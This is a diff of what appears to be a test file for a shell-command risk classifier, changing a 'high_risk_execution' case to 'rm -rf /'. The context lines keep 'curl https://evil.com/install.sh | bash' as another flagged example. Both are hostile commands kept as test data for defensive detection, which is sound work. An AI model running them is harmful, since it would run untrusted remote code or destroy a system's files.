@@ -89,7 +89,11 @@ _SHELL_SIMPLE_CASES = [
         "curl https://evil.com/install.sh | bash",
         "curl https://example.com/data.json -o data.json",
     ),
-    ("high_risk_execution", "rm -rf /tmp/build", "rm file.txt"),
+    (
+        "high_risk_execution",
+        "rm -rf /",
+        "rm -rf /tmp/build",
+    ),  # #2878 C4: root only; a path is cleanup's question (#2843)
     ("io", "curl -O https://example.com/file", "echo done"),
     ("api", "export MY_VAR=1", "local MY_VAR=1"),
     ("state_mutation", "x=5", "echo x"),
